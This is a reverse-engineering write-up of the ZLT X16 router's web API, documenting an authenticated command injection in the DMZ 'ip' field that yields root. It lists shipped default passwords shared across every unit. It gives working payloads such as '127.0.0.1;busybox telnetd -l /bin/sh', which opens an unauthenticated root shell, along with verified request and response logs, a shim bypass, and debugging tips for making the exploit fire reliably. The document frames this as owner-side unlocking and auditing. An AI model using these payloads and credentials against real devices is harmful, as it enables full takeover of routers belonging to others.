# Protocol notes — ZLT X16 web management API

Reverse engineered from the firmware's own served JavaScript
(`/tzwww/js/login.js`, `/tzwww/js/main.js`) and from the request artifact the
device keeps at `/productinfo/tzcfg/iptables/iptables_dmz_function`.

Everything goes through one CGI entry point:

```
POST /cgi-bin/http.cgi?cmd=<n>&method=<GET|POST>&sessionId=<sid>&language=<en|cn>
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Referer: <origin>/login.html
```

The `cmd`, `method`, `sessionId` and `language` appear **both** as query
parameters and inside the JSON body.

## Command numbers (from the `RequestCmd` enum)

| Name | Value | Notes |
|---|---|---|
| `SYS_INFO` | 0 | |
| `NET_CONNECT` / `NET_DISCONNECT` | 48 / 49 | |
| `GET_HTML` | 50 | fetches page fragments |
| `INIT_PAGE` | 80 | device identity, theme, `aeraId` |
| `REBOOT` | 99 | |
| `LOGIN` | 100 | |
| `LOGOUT` | 101 | |
| `CHANGE_PASSWD` | 102 | |
| `NETWORK_SERVICE` | 172 | DMZ / network-service page |
| `GET_DMZ` | 214 | read the DMZ config |
| `GET_NEXT_LOGIN_TIME` | 232 | returns the login token |
| `DEVICE_INFO` | 207 | |

## Login

Two steps. The password is **not** sent in the clear and is **not** base64 —
it is salted with a server token and hashed.

**Step 1** — fetch the token:

```json
{"cmd": 232, "method": "GET", "sessionId": ""}
```

Response: `{"token": "..."}`

**Step 2** — submit credentials:

```json
{
  "cmd": 100,
  "method": "POST",
  "sessionId": "<any random 32 chars>",
  "username": "admin",
  "passwd": "<sha256_hex(token + password)>",
  "isAutoUpgrade": "0"
}
```

Response on success:

```json
{"success":"success","AUTH":"AUTH","sessionId":"...","user_level":"3"}
```

`user_level`/`account_level` is the privilege tier (`1` highest, `3` lowest).
`AUTH` is the flag the UI stores to mean "logged in".

Failure responses use `{"success":"fail","login_fail":"fail","message":"passwd error"}`
plus `login_fail2` / `login_time` when the account is rate-limited.

### Shipped credentials

The firmware ships, identical on every unit of this model:

| Key | Default |
|---|---|
| `SYS_USER_LOGIN_NAME` | `admin` |
| `SYS_USER_LOGIN_PWD` | `admin` |
| `SYS_SENIOR_LOGIN_NAME` | `root` |
| `SYS_SENIOR_LOGIN_PWD` | `admin` |
| `SYS_SUPER_LOGIN_NAME` | `superadmin` |
| `SYS_SUPER_LOGIN_PWD` | `83583000` |

## Privilege model — the super account is NOT required

This is the single most misunderstood part of the protocol, so it is stated
plainly and with evidence.

**`admin`/`admin` is enough.** The DMZ handler is gated on *session validity*,
not on account tier.

### Where the check actually lives

The firmware's authorisation routine is `authenticate()` in `http.c`. It is one
big switch on the command number:

```c
/* http.c ~877-1061 (decompiled shape) */
switch (cmd) {
case 80: case 82: case 97: case 100: case 113:
        /* allowed with no session: INIT_PAGE, LOGIN, language, ... */
        break;
case 133: case 205: case 352: case 356: case 358: case 308: case 310: case 442:
        /* special-cased */
        break;
default:
        if (!check_auth_sessionid(sessionId)) {
                log("AUTH FAIL - Session invalid - CMD %d", cmd);
                return NO_AUTH;
        }
}
```

The only two outcomes are "session valid" and `NO_AUTH`. There is no branch
that compares `account_level`. The handler itself
(`process_network_service()`, `http.c:3796`) contains no authorisation code at
all — it parses `subcmd`, `ip` and `enabled`, writes `TZ_ENABLE_DMZ` /
`TZ_DMZ_DEST_IP` via `set_config_attr()`, and calls `process_apply_filter()`,
which raises firewall event `0x7005`. The firewall daemon then builds its
command with the `ip` string in it.

`account_level` only drives UI page visibility. `/tzwww/js/main.js`:

```js
pageHideCheck2: function (page) {
  var f = Page.webPageFlag;
  return "1" == f[page] ? ("1" == Page.level || "2" == Page.level)   // super-only page
       : "2" == f[page] ? ("1" == Page.level || "2" == Page.level || "3" == Page.level)
       : "3" != f[page] || "1" == Page.level;
}
```

So level 1 hides/unhides menu entries. It does not guard `cmd:172 subcmd:6`.

### Verified

Against the stock vendor CGI (`http.cgi.bak` on a unit whose `/cgi-bin/http.cgi`
had been replaced by an unlock shim — see below), with the global level flag
forced to the lowest tier first:

```
# mdlcfg -f account_level=3 && rm -f /tmp/account_level

POST /cgi-bin/http.cgi.bak?cmd=100  {"username":"admin","passwd":sha256(token+"admin")}
  -> {"success":true,"AUTH":"AUTH","sessionId":"c7bf..."}

POST /cgi-bin/http.cgi.bak?cmd=172  {"cmd":172,"subcmd":6,"enabled":"1",
                                     "ip":"127.0.0.1;id > /tmp/.zlt_t3_admin"}
  -> {"success":true,"cmd":172,"message":""}

# cat /tmp/.zlt_t3_admin
uid=0(root) gid=0(root)
# cat /tmp/account_level
3
```

Root, from the ordinary level-3 account. Repeating the same request with an
empty or bogus `sessionId` returns `{"success":false,"message":"NO_AUTH"}`, so
the session check is real — it is simply not a *privilege* check.

### What "unlocking" a ZLT X16 actually does

On a unit that has been "unlocked", `/cgi-bin/http.cgi` is not the vendor CGI.
It is a small static shim (468 680 B, mtime rewritten at unlock time) that:

1. writes `1/\n` to `/tmp/account_level`,
2. runs `mdlcfg -f account_level=1` then `mdlcfg -c` (persist to flash),
3. `system("./http.cgi.bak <original cgi args>")`,

then the *real* vendor CGI (2 188 384 B, `system:system`, kept beside it as
`http.cgi.bak`) handles the request.

That shim raises the UI tier to 1 fleet-wide and persists it. It is an
**elevation of the management UI**, not a precondition for the RCE — the RCE
works without it. Note that `cgipat=cgi-bin/*` in `/tmp/mini_httpd.conf` means
`http.cgi.bak` is itself directly executable, so the shim can be bypassed by
URL.


## The injection point

`NETWORK_SERVICE` (172) with `subcmd: 6` is the network-service page that holds
the DMZ function. Its `ip` field is interpolated into a command that the device
executes **as root**, so `;` starts an additional command.

The device's own saved record of such a request:

```json
{"enabled":"1",
 "ip":"127.0.0.1;busybox telnetd -l \/bin\/sh",
 "cmd":172,"subcmd":6,"success":true,"method":"POST",
 "sessionId":"bda24badbc70d8d821c500304878fdced90380256d76f5584488ff9021525bf0"}
```

General shape:

```json
{
  "cmd": 172,
  "method": "POST",
  "subcmd": 6,
  "sessionId": "<authenticated session>",
  "enabled": "1",
  "ip": "<valid-ipv4>;<command>"
}
```

`busybox telnetd -l /bin/sh` replaces the login program with a shell, so the
resulting daemon performs no authentication at all.

## Verification

A shell started this way is observable without any further protocol work:

- TCP connect to the chosen port succeeds
- the peer sends no `login:` / `username:` / `password:` prompt
- it answers with a shell banner or prompt (`/ #`)

The vendor's own telnet path is different and easy to distinguish:
`/etc/initscripts/start_telnet` runs `telnetd -l /etc/tzscript/telnet_login.sh -p 9876`
— a different port, with a real login handler, gated by `SYS_TELNET_SWITCH`.

## Response quirks worth handling

| Observed | Handling |
|---|---|
| `200 OK` with an **empty body** | treat as an error, not success |
| Connection closed mid-request when a daemon is spawned | treat as "sent", verify out of band |
| `{"message":"NO_AUTH"}` / `LOGIN_TIMEOUT` | session expired; re-login |
| `{"message":"NO_AUTH"}` on the config POST | credentials or session id wrong |

## Notes on scope

This document describes the device's own behaviour, established from artifacts
already present on a device the author controls. It is provided so the tooling
can be maintained and audited.

## After the injection: what you actually get

**You get telnet, not SSH.** The stock image contains no SSH server at all —
`find / -name '*dropbear*'` is empty and there is no package feed. `unlock`
installs a passwordless `busybox telnetd`; turning that into SSH is a separate,
manual bootstrap (dropbear binary + host keys + boot wiring + an iptables ACCEPT
that has to land *after* TZApp rebuilds the firewall). The `ssh` subcommand
automates that sequence; it needs a local ARM32 hard-float dropbear because the
toolkit does not ship one.

### The port varies

| Port | What it is |
|---|---|
| 23 | the classic target, and what the recovered artifact shows |
| 2233 | observed on an unlocked OMN247 unit - the daemon ends up here when 23 is already taken |
| 9876 | the **vendor's** telnet: `/etc/initscripts/start_telnet`, a real login handler, gated by `SYS_TELNET_SWITCH` |
| 22 | only exists after a dropbear bootstrap |

`verify` therefore probes 23, 2233, 9876 (and 22) by default, and `unlock -dport`
puts the daemon wherever you want — but always check all of them, because a
previous session may already hold the port you asked for and your new daemon
will fail to bind while an older one answers.

### The write is asynchronous and not always applied

`cmd:172 subcmd:6` only *saves* the DMZ function and raises firewall event
`0x7005`. The actual `iptables ... -d <ip> ...` command is built and executed
later by the `firewalltools` daemon, which is where the `;` takes effect. A
single request is therefore not reliable — observed behaviour on X16-OMN247:

- the write is accepted (`{"success":true,"cmd":172}`) every time;
- `mdlcfg -g TZ_DMZ_DEST_IP` and `/productinfo/tzcfg/iptables/iptables_dmz_function`
  always update immediately;
- a shell appeared on some attempts and not others within the same boot.

Practical consequence: `unlock` forces a `enabled:0` → `enabled:1` transition,
re-submits up to `-attempts` times (default 3), and re-probes the port list after
each. If the saved value is correct but nothing fires, the payload will normally
run on the next firewall rebuild or boot.

## Client gotchas that silently break the exploit

Two of these cost real debugging time; both are handled by the reference
implementation now.

### 1. The HTTP verb is always POST

`method` is a **parameter** (`GET`/`POST`) carried in the query string and the
JSON body — it is *not* the HTTP verb. Sending a literal `GET` for the `cmd:232`
token step makes mini_httpd hand the CGI no body; the device accepts the
connection and then never replies, which presents as a timeout:

```
$ curl -s -m 6 -X GET  'http://192.168.3.1/cgi-bin/http.cgi?cmd=232&method=GET...' -d '{"cmd":232}'
000 6.008  <- hung
$ curl -s -m 6 -X POST 'http://192.168.3.1/cgi-bin/http.cgi?cmd=232&method=GET...' -d '{"cmd":232}'
{"success":true,"cmd":232,"buffer":"2","token":"0aa8...","netx_login_time":"827"}   200 0.06
```

### 2. Do not HTML-escape `<`, `>`, `&` in the JSON

Go's `encoding/json` escapes them to `\u003c`, `\u003e`, `\u0026` by default. The
CGI's hand-rolled JSON reader strips the backslash but does **not** decode
`\uXXXX`, so

```
"ip": "127.0.0.1;id > /tmp/marker"
```

is stored as `127.0.0.1;id u003e /tmp/marker` — the redirect disappears, the
command becomes `id u003e /tmp/marker` (harmless), and the device still answers
`{"success":true}`. The failure is invisible unless you read the value back:

```sh
mdlcfg -g TZ_DMZ_DEST_IP
# 127.0.0.1;id u003e /tmp/marker          <- escaping damage
```

Use an encoder with HTML escaping disabled. The vendor's own saved artifact
escapes `/` as `\/`, which the parser *does* handle; `\uXXXX` it does not.

### 3. `success` is a bool for some commands and a string for others

`cmd:232` answers `"success":true`; `cmd:100` answers `"success":"success"`.
Decoding into a fixed Go type fails on the other form. Also note that a
rate-limited login answers `"success":"true"` *with no session* — treat
`Authed()` as "AUTH flag or a sessionId is present", never as "success is set".
Failed logins start a lockout (`buffer:"2"`, `netx_login_time` seconds), so an
aggressive credential sweep can make a correct password look wrong.
